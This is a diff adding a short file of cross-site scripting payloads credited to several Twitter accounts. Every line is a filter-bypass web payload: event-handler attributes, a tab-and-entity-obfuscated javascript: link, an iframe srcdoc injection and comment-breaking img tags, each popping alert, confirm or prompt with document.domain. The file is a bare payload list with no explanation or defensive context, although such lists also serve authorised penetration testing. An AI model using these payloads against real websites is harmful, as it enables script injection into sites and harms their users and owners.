@@ -1,0 +1,23 @@
+from
+https://twitter.com/s0md3v
+<a"/onclick=(confirm)()>Click Here!
+
+From
+https://twitter.com/h1_ragnar
+Dec: <svg onload=prompt%26%230000000040document.domain)>
+Hex: <svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+
+From
+https://twitter.com/ahmetumitbayram
+<--`<img/src=` onerror=confirm``> --!>
+
+From 
+https://twitter.com/ameenmaali
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+
+From
+https://twitter.com/joris909
+<--`<img/src=` onerror=confirm``> --!>
+
+<--%253cimg%20onerror=alert(1)%20src=a%253e --!>
